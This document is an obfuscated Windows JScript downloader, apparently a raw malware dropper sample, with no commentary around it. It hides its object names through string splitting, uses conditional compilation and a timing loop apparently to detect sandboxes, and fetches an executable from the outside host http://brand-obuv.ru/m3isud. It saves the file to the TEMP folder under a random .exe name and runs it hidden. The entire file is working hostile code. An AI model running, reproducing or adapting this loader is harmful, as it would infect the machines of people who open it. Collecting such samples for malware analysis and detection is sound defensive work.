var KG = false;
var Y0 = "Create"+"Object";
var P = function TB() {return WScript[Y0]("WScript"+".Shell");}(), Y1 = 11;
var NV = "MSXML2"+".XMLHTTP";
var J = 2;
var PN0 = J - 2;
function GR(WS){P["Run"](WS, PN0, PN0);};
function O(){return NV + "";};
function Q(N0, NU){PN0 = PN0 * 1; return N0 - NU;};
function U(){return Y0;};
/*@cc_on
  @if (@_win32 || @_win64)
    KG = true;
  @end
@*/
if (KG)
{
var EJ = "";
function Y(){return 22;};
var UY = 0; var G = 0;
function PN()
{
var VI = new this["Date"]();
var HW = VI["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var VI = new this["Date"]();
var H = VI["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var VI = new this["Date"]();
var EN = VI["getUTCMilliseconds"]();
var UY = "GX";
UY = Q(H, HW);
var G = "MV";
G = Q(EN, H);
EJ = "open";
return Q(UY, G);
}
var N = false;
var QB = false;
for (var WQ = PN0; WQ < Y() * 1; WQ++){if (PN() != PN0){
N = true; 
G = "31" + 11 * UY + G; 
QB = true; 
break;
}}
function RQ() {return ((N == true) && (N == QB)) ? 1 : PN0;};
if (N && RQ() && QB){
function W() {return P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5ytnZZ3CMay5v.ex" + "e";};
 C = O();
 Q0 = WScript[Y0](C);
 var D = 1;
do { 
	for (;D;){
	try {
		if (D == 1)
		{
			Q0[EJ]("GET", "http://brand-obuv.ru/m3isud", false);
			Q0["send"]();
			T = "Sleep";
			D = 2;
		}
		WScript[T](Y() + 120); 
		if (Q0["readystate"] < 2 * 2) continue;
		D = PN0;
		function QT(WH) {var Z = (1, 2, 3, 4, 5, WH); return Z;};
		W0 = WScript[U()]("ADODB.Stream");
		C = W0;
		C[EJ]();
		C["type"] = QT(1);
		C["write"](Q0["ResponseBody"]);
		W0["position"] = QT(PN0);
		C["Save" + "ToFile"](W(), 2);
		W0["cl"+"ose"]();
		SK = W();
		GR(SK);
	} catch(SC){};};
}while (D);
}
}

